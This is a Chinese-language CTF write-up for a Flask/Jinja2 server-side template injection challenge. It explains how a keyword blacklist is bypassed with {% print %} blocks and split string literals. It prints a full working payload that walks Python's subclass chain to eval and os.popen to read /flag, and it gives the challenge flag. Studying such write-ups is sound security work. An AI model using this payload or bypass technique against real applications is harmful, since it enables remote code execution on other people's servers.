# week2i_want_4090ssti

## 题目简述

Flask 接口把用户提交的 `formula` 直接交给 `render_template_string()`，形成 Jinja2 SSTI。黑名单禁止 `{{ }}` 以及 `class`、`import`、`open` 等字符串，但没有禁止 `{% %}` 语句块，也没有在模板解析后限制对象访问。

## 解题过程

使用 `{% print(...) %}` 输出表达式，避开双花括号；再利用相邻字符串字面量自动拼接，把被拦截的关键字拆开。由 `object.__subclasses__()` 枚举类，定位 `catch_warnings`，通过其 `__init__.__globals__` 找到含 `eval` 的 builtins 字典，最终导入 `os` 并执行命令：

~~~jinja
{% for c in []['__cla''ss__']['__ba''se__']['__subc''lasses__']() %}
{% if c.__name__ == 'catch_warnings' %}
    {% for b in c.__init__.__globals__.values() %}
    {% if b['__cl''ass__'] == {}['__cl''ass__'] %}
        {% if 'ev''al' in b.keys() %}
            {% print(b['eval']('__im''port__("os").pop''en("cat /flag").read()')) %}
        {% endif %}
    {% endif %}
    {% endfor %}
{% endif %}
{% endfor %}
~~~

这里 `__cla''ss__`、`__ba''se__`、`__subc''lasses__`、`ev''al`、`__im''port__` 和 `pop''en` 在 Python/Jinja 解析后会重新拼成完整标识，但原始请求中不包含黑名单连续字符串。命令读取容器根目录的 `/flag`，返回：

```text
0xGame{ssti_great_1nter3sting}
```

## 方法总结

- 核心方法：用 Jinja 语句块代替被过滤的输出表达式，并通过字符串拼接和 Python 对象链恢复命令执行能力。
- 识别特征：输入进入 `render_template_string`，普通算式之外的模板语法会被解释，过滤器只检查原始字符串中的若干关键字。
- 注意事项：`__subclasses__()` 下标会随环境变化，按类名搜索比写死下标稳定；证明 RCE 后应在正文中明确实际读 flag 的命令，而不是只停留在 `whoami`。
